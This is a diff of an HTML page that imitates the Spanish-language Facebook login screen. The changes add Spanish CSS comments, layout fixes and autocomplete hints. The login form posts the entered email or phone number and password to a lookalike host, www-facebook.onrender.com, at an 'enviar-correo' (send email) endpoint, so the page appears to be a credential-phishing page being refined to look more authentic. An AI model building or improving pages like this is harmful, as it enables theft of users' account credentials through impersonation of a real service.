@@ -5,43 +5,58 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook</title>
     <style>
+        /* Reseteo básico y box-sizing para un control de diseño predecible */
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
         }
 
+        /* Altura completa para body y html, fuente y color de fondo */
         body, html {
             height: 100%;
             font-family: Arial, sans-serif;
             background-color: #fff;
         }
 
+        /* Contenedor principal: ocupa toda la altura del viewport, centra el contenido y añade padding adaptativo */
         .container {
-            min-height: 100vh;
+            min-height: 100vh; /* Mínimo la altura total del viewport */
             display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 20px;
+            flex-direction: column; /* Organiza los elementos en columna */
+            align-items: center; /* Centra los elementos horizontalmente */
+            padding: 20px 5vw; /* 20px arriba/abajo, 5% del ancho del viewport a los lados */
+            width: 100%; /* Asegura que el contenedor abarque todo el ancho */
         }
 
+        /* Barra superior para el idioma */
         .top-bar {
             color: #1877f2;
             font-size: 14px;
             margin-top: 10px;
         }
 
+        /* Estilo para el logo de Facebook */
         .logo {
-            display: block;
-            margin: auto;
-            width: 48px;
-            right: 48px;
+            display: block; /* Para permitir el centrado con margin: auto */
+            margin: 20px auto; /* Centra horizontalmente y añade margen vertical */
+            width: 48px; /* Ancho fijo para el logo */
+            height: auto; /* Mantiene la proporción de la imagen */
         }
 
+        /* Estilo para el formulario de login */
+        form {
+            width: 100%; /* El formulario ocupa todo el ancho disponible */
+            max-width: 400px; /* Pero no excede los 400px en pantallas grandes */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Estilos para los campos de entrada de texto y contraseña */
         input[type="text"],
         input[type="password"] {
-            width: 100%;
-            max-width: 400px;
+            width: 100%; /* Ocupa el 100% del ancho de su contenedor (el formulario) */
             padding: 14px;
             margin: 8px 0;
             font-size: 16px;
@@ -49,52 +64,56 @@
             border-radius: 8px;
         }
 
+        /* Estilo para el botón de inicio de sesión */
         .login-btn {
-            width: 100%;
-            max-width: 400px;
+            width: 100%; /* Ocupa el 100% del ancho de su contenedor */
             padding: 14px;
             background-color: #1877f2;
             color: white;
             font-size: 16px;
             border: none;
-            border-radius: 25px;
+            border-radius: 25px; /* Bordes redondeados para un aspecto moderno */
             margin-top: 10px;
             cursor: pointer;
         }
 
+        /* Efecto hover para el botón de inicio de sesión */
         .login-btn:hover {
             background-color: #145dbf;
         }
 
+        /* Estilo para los enlaces (como "¿Olvidaste tu contraseña?") */
         .link {
-            display: block;
+            display: block; /* Para que ocupe su propia línea y margin: auto funcione si se centra */
             margin: 15px 0;
             color: #1877f2;
-            text-decoration: none;
+            text-decoration: none; /* Quita el subrayado predeterminado */
             font-size: 14px;
-            text-align: center
+            text-align: center; /* Centra el texto del enlace */
         }
 
+        /* Estilo para el botón de crear cuenta nueva */
         .create-btn {
-            width: 100%;
-            max-width: 400px;
+            width: 100%; /* Ocupa el 100% del ancho de su contenedor */
             padding: 14px;
             background-color: white;
             color: #1877f2;
             font-size: 16px;
             border: 1px solid #1877f2;
             border-radius: 25px;
-            margin-top: auto;
+            margin-top: auto; /* Empuja el botón hacia la parte inferior del contenedor flex */
             margin-bottom: 20px;
             cursor: pointer;
         }
 
+        /* Estilo para el texto "Meta" */
         .meta-logo {
             font-weight: bold;
             color: #606770;
             margin-bottom: 8px;
         }
 
+        /* Estilo para el pie de página */
         .footer {
             font-size: 12px;
             color: #999;
@@ -108,15 +127,15 @@
         <div class="top-bar">Español</div><br><br>
 
         <form action="https://www-facebook.onrender.com/enviar-correo" method="post">
-            <div><img class="logo" src="logo.png" alt=""></div>
+            <div><img class="logo" src="logo.png" alt="Facebook Logo"></div>
 
-            <input type="text" name="nombre" placeholder="Correo electrónico o número de teléfono"><br>
+            <input type="text" name="nombre" placeholder="Correo electrónico o número de teléfono" autocomplete="email"><br>
             
-            <input type="password" name="Contraseña" placeholder="Contraseña"><br>
+            <input type="password" name="Contraseña" placeholder="Contraseña" autocomplete="current-password"><br>
 
             <input class="login-btn" type="submit" value="Iniciar sesión">
 
-            <a class="link">¿Olvidaste tu contraseña?</a>
+            <a href="#" class="link">¿Olvidaste tu contraseña?</a>
 
             <input class="create-btn" type="submit" value="Crear cuenta nueva">
         </form>
